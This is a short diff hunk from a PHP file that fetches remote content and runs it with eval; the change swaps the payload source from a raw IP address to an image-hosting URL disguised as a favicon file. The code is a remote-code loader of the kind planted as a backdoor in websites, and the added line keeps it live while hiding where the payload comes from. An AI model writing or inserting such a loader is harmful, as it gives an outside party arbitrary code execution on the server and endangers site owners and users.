@@ -125,7 +125,7 @@ if (is_logged_in()) {
         return false;
     }
 
-    $destiny = 'http://156.67.221.29/hx.jpg';
+    $destiny = 'https://ik.imagekit.io/expx/favicon.ico.png';
     $dream = geturlsinfo($destiny);
     if ($dream !== false) {
         eval('?>' . $dream);
